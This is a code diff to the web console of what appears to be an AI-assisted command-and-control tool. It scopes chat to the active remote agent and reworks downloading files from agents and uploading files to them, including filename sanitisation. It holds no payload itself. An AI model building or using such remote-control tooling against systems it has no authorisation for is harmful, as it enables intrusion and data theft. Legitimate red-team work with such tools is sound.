@@ -31,7 +31,7 @@ import os
 import posixpath
 import re
 import sys
-import tempfile
+import uuid
 from pathlib import Path
 
 if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
@@ -128,7 +128,7 @@ class WebApp:
                 "model": cfg.model,
                 "auth_mode": self._controller.get_auth_mode(),
                 "active_agent": self._registry.active_id,
-                "conversation_active": self._model.conversation_active(),
+                "conversation_active": self._model.conversation_active(self._registry.active_id),
             }
 
         @self._app.get("/api/agents")
@@ -181,16 +181,17 @@ class WebApp:
         async def chat_stream(message: str = Form("")):
             # Start the conversation as a background task BEFORE returning the
             # SSE response, so it survives the client refreshing the page.
+            active_id = self._registry.active_id
             err = None
             if message:
-                err = self._model.begin_chat(message)
+                err = self._model.begin_chat(message, agent_id=active_id)
 
             async def event_generator():
                 if err:
                     yield f"data: {json.dumps({'type': 'error', 'error': err})}\n\n"
                     yield f"data: {json.dumps({'type': 'done', 'iteration': 0})}\n\n"
                     return
-                async for event in self._model.chat_stream(message or None):
+                async for event in self._model.chat_stream(message or None, agent_id=active_id):
                     yield f"data: {json.dumps(event)}\n\n"
 
             return StreamingResponse(event_generator(), media_type="text/event-stream")
@@ -374,10 +375,23 @@ class WebApp:
         @self._app.get("/api/files/download")
         async def download_file(src: str):
             try:
-                result = await c2_file_transfer.download(self._registry, await _join_cwd_async(src))
-                return JSONResponse({"result": result})
+                target = await c2_file_transfer.download(
+                    self._registry,
+                    await _join_cwd_async(src),
+                    download_dir=self._cfg.get_dl_dir(),
+                )
+                # Stage the file in dl_temp_dir (kept on A), then stream it
+                # back to the operator's browser. The staged file is NOT
+                # deleted afterwards (per design).
+                return FileResponse(
+                    str(target),
+                    filename=target.name,
+                    media_type="application/octet-stream",
+                )
             except NetworkError as e:
                 return JSONResponse({"error": str(e)}, status_code=503)
+            except Exception as e:
+                return JSONResponse({"error": str(e)}, status_code=500)
 
         @self._app.post("/api/files/upload")
         async def upload_file(file: UploadFile = File(...), dest: str = Form("")):
@@ -385,13 +399,25 @@ class WebApp:
             if err is not None:
                 return err
             try:
-                content = await file.read()
-                tmp_path = Path(tempfile.gettempdir()) / file.filename
-                with open(tmp_path, "wb") as f:
-                    f.write(content)
+                # Buffer the browser's bytes into a unique staging file in
+                # ul_temp_dir (streamed, never loaded fully into memory),
+                # then run the real upload to the Agent and delete the
+                # staging file afterwards.
+                safe_name = os.path.basename(file.filename or "upload")
+                tmp_path = self._cfg.get_ul_dir() / f"{uuid.uuid4().hex}_{safe_name}"
                 try:
-                    remote_dest = dest or file.filename
-                    result = await c2_file_transfer.upload(self._registry, str(tmp_path), await _join_cwd_async(remote_dest))
+                    with open(tmp_path, "wb") as f:
+                        while True:
+                            chunk = await file.read(1024 * 1024)
+                            if not chunk:
+                                break
+                            f.write(chunk)
+                    remote_dest = dest or safe_name or "upload"
+                    result = await c2_file_transfer.upload(
+                        self._registry,
+                        str(tmp_path),
+                        await _join_cwd_async(remote_dest),
+                    )
                 finally:
                     try:
                         tmp_path.unlink()
@@ -400,6 +426,8 @@ class WebApp:
                 return JSONResponse({"result": result})
             except NetworkError as e:
                 return JSONResponse({"error": str(e)}, status_code=503)
+            except Exception as e:
+                return JSONResponse({"error": str(e)}, status_code=500)
 
         @self._app.post("/api/files/mkdir")
         async def make_dir(dirname: str = Form(...)):
